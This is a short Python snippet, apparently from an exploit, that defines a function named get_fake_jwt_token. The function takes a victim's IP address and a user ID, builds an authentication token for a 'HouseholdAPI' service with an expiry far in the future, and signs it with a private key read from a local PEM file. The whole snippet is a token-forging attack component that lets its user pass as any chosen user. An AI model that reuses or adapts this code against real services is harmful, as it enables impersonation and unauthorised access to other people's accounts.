# pip install pyjwt, cryptography...
import jwt


def get_fake_jwt_token(victim_ip, user_id, private_key=None):
    payload = {
        "nbf": "1574490000",
        "exp": "1999999999",
        "iss": victim_ip,
        "aud": "HouseholdAPI",
        "client_id": "Household",
        "sub": user_id,
        "auth_time": "1574492300",
        "idp": "local",
        "scope": [
            "openid",
            "profile",
            "HouseholdAPI"
        ],
        "amr": [
            "pwd"
        ]
    }

    if private_key is None:
        with open('private.pem', 'r') as f:
            private_key = f.read()

    encoded = jwt.encode(payload, private_key, algorithm='PS512')
    return encoded
